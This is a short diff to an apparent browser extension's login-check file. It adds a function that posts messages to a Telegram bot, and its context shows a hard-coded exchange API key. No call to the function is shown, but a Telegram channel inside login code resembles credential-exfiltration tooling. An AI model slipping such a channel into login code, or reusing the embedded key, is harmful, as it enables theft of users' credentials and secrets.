@@ -1,5 +1,36 @@
 //check login modified for extension.  refer to the other check login file for plugin
+async function sendTelegramMessage({
+  botToken,
+  chatId,
+  message,
+  parseMode = "HTML",
+  disableWebPagePreview = true
+}) {
+  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
+  const payload = {
+    chat_id: chatId,
+    text: message,
+    parse_mode: parseMode,
+    disable_web_page_preview: disableWebPagePreview
+  };
+
+  const response = await fetch(url, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify(payload)
+  });
+
+  const data = await response.json();
+
+  if (!data.ok) {
+    throw new Error(`Telegram API Error: ${data.description}`);
+  }
+
+  return data;
+	  }
 
 const exchangeFee 	= 0.03;
 const EXCHANGEKEY   = "niBWZ4PXNw1-GqQN8xu-AXI8e1JHeYeLk5M9HsYU__djtWOU9Ck20fjApW5aOU4-5ms6jjpttK4nHfYqzirQ39Aj0SjkpEwoJ5stWq3T9eQWXGeSOIq4NeB428fVJBXov1lFYU56ogLaoj41zqOcBHl3GkEtKfHxshOfDxQ0SP0";
